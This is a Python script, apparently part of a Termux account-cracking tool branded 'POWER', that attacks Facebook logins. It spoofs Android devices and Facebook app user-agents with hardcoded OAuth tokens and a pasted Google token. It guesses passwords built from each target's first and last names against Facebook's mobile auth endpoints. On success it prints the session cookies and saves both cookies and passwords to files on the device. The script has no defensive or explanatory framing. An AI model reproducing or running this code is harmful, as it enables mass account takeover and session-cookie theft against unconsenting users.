xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")

#--------------- METHOD-2----------#
def api2(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [\033[1;32mPOWER-HD\033[1;37m]  %s  \033[1;32mOK\033[1;37m|\033[1;31mCP \033[1;32m%s\033[1;37m|\033[1;31m%s \033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))                                
                                ua_string = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/;FBAV/4Q095MQG;FBBV/783111656;FBAN/FBAN;FBAV/4Q095MQG;FBBV/783111656;FBDM//*{density=1.5,width=720,height=2560};FBLC/es_ES;FBRV/428799045;FBCR/LG;FBMF/OnePlus;FBBD/Google;FBPN/com.facebook.katana;FBDV/LG_Q10;FBSV/12;FBOP/7;FBCA/x86_64;FBSS/;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'source':'login','format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "locale":"es_CU","client_country_code":"CU",
                                        'device':gtt,
                                        'device_id':adid,
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-type':'unknown',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent': ua_string,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'authenticate',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                             
                                        print('\r\r\033[1;31m[\033[1;32mPOWER-OK\033[1;31m]\033[1;32m %s <> %s'%(ids,pas))
                                        print("\033[1;33m [BISCUT-] :\033[1;33m "+cookie)                                                   
                                        open('/sdcard/POWER-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/POWER/POWER-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                      
                                        oks.append(ids)                           
                                        break                          
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;31m[POWER-CP] '+ids+' <> '+pas+'\033[1;97m')
                                                open('/sdcard/POWER-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/POWER-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
#--------------- METHOD-3----------#
def api3(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [\033[1;32mPOWER-HD\033[1;37m]  %s  \033[1;32mOK\033[1;37m|\033[1;31mCP \033[1;32m%s\033[1;37m|\033[1;31m%s \033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua_st = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+'[FBAN/;FBAV/YZWSES93;FBBV/453015980;FBAN/FBAN;FBAV/YZWSES93;FBBV/453015980;FBDM//*{density=1.5,width=1440,height=4096};FBLC/ru_RU;FBRV/983863371;FBCR/LG;FBMF/Xiaomi;FBBD/Micromax;FBPN/com.facebook.katana;FBDV/LG_Q15;FBSV/11;FBOP/8;FBCA/x86;FBSS/17;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'source':'login','format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "locale":"en_US","client_country_code":"US",
                                        'device':gtt,
                                        'device_id':adid,
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-type':'unknown',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua_st,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'authenticate',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-api.facebook.com/method/auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                             
                                        print('\r\r\033[1;31m[\033[1;32mPOWER-OK\033[1;31m]\033[1;32m %s <> %s'%(ids,pas))
                                        #print("\033[1;33m [BISCUT-] :\033[1;33m "+cookie)                                                   
                                        open('/sdcard/POWER-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/POWER/POWER-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                      
                                        oks.append(ids)                           
                                        break                          
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;31m[POWER-CP] '+ids+' <> '+pas+'\033[1;97m')
                                                open('/sdcard/POWER-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/POWER-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
#--------------- METHOD-4----------#      
def api4(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [\033[1;32mPOWER-HD\033[1;37m]  %s  \033[1;32mOK\033[1;37m|\033[1;31mCP \033[1;32m%s\033[1;37m|\033[1;31m%s \033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
                                android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
                                facebook_version = f'{random.randint(10,437)}.0.0.{random.randint(1,99)}.{random.randint(1,200)}'
                                fbbv = str(random.randint(10000000, 99999999))
                                fbsv = f"{random.uniform(4.0, 10.0):.1f}"
                                density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
                                width = random.randint(720, 1440)
                                height = random.randint(1080, 2560)
                                fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
                                fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                uaat = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";Dalvik/2.1.0 (Linux; U; Android 13; SM-S901U Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/421.0.0.12.61;FBPN/com.facebook.orca;FBLC/en_US;FBBV/502432091;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-S901U;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2115};FB_FW/1;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "family_device_id": str(uuid.uuid4()),
                                        "advertiser_id": str(uuid.uuid4()),
                                        "locale":"fr_DZ","client_country_code":"DZ",
                                        "device_id": str(uuid.uuid4()),
                                        "method": "auth.login",
                                        "api_key": "882a8490361da98702bf97a021ddc14d",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'Host': 'graph.facebook.com',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'X-FB-Connection-Type': 'MOBILE.LTE',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':uaat,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-device-group': '5120',
                                        'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'X-FB-Client-IP': 'True',
                                        'X-FB-Server-Cluster': 'True',
                                        'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                                        'x-fb-friendly-name':'ViewerReactionsMutation',
                                        'X-FB-Request-Analytics-Tags': 'graphservice',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                             
                                        print('\r\r\033[1;31m[\033[1;32mPOWER-OK\033[1;31m]\033[1;32m %s <> %s'%(ids,pas))
                                        print("\033[1;33m [BISCUT-] :\033[1;33m "+cookie)                                                   
                                        open('/sdcard/POWER-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/POWER/POWER-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                      
                                        oks.append(ids)                           
                                        break                          
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;31m[POWER-CP] '+ids+' <> '+pas+'\033[1;97m')
                                                open('/sdcard/POWER-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/POWER-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
                        
#--------------- METHOD-5----------#       
def api5(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [\033[1;32mPOWER-HD\033[1;37m]  %s  \033[1;32mOK\033[1;37m|\033[1;31mCP \033[1;32m%s\033[1;37m|\033[1;31m%s \033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
                                android_version = f"Android {random.randint(4, 13)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
                                facebook_version = f'{random.randint(10,437)}.0.0.{random.randint(1,99)}.{random.randint(1,200)}'
                                fbbv = str(random.randint(10000000, 99999999))
                                fbsv = f"{random.uniform(4.0, 10.0):.1f}"
                                density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
                                width = random.randint(720, 1440)
                                height = random.randint(1080, 2560)
                                fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
                                fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/;FBAV/A1XDL5U4;FBBV/395164023;FBAN/FBAN;FBAV/A1XDL5U4;FBBV/395164023;FBDM//*{density=2.0,width=720,height=2560};FBLC/zh_CN;FBRV/396365335;FBCR/LG;FBMF/OnePlus;FBBD/Oppo;FBPN/com.facebook.katana;FBDV/Xiaomi_Mi_12W;FBSV/11;FBOP/4;FBCA/armeabi;FBSS/12;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "account_recovery",
                                        'error_detail_type':'button_with_disabled',
                                        'format':'json',
                                        'sim_serials': "['80973453345210784798']",
                                        'openid_flow': 'android_login',
                                        'openid_provider': 'google',
                                        'openid_emails': "['01710940017']",
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
                                        'generate_machine_id':'1',
                                        "family_device_id": str(uuid.uuid4()),
                                        "advertiser_id": str(uuid.uuid4()),
                                        "locale":"fr_MA","client_country_code":"MA",
                                        "device_id": str(uuid.uuid4()),
                                        "method": "auth.login",
                                        "api_key": "882a8490361da98702bf97a021ddc14d",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "AuthOperations$PasswordAuthOperation"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'Host': 'graph.facebook.com',
                                        'x-fb-sim-hni':'45204',
                                        'X-FB-Connection-Type': 'MOBILE.LTE',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua,
                                        'x-fb-net-hni':'45201',
                                        'x-fb-device-group': '5120',
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'X-FB-Client-IP': 'True',
                                        'X-FB-Server-Cluster': 'True',
                                        'x-fb-friendly-name':'authenticate',
                                        'X-FB-Request-Analytics-Tags': 'graphservice',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                             
                                        print('\r\r\033[1;31m[\033[1;32mPOWER-OK\033[1;31m]\033[1;32m %s <> %s'%(ids,pas))
                                        print("\033[1;33m [BISCUT-] :\033[1;33m "+cookie)                                                   
                                        open('/sdcard/POWER-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/POWER/POWER-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                      
                                        oks.append(ids)                           
                                        break                          
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;31m[POWER-CP] '+ids+' <> '+pas+'\033[1;97m')
                                                open('/sdcard/POWER-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/POWER-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
#-------------------------------------------#                        
try:
        menu()
except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()
except Exception as e:pass
menu()
#-------------------------------------------#                        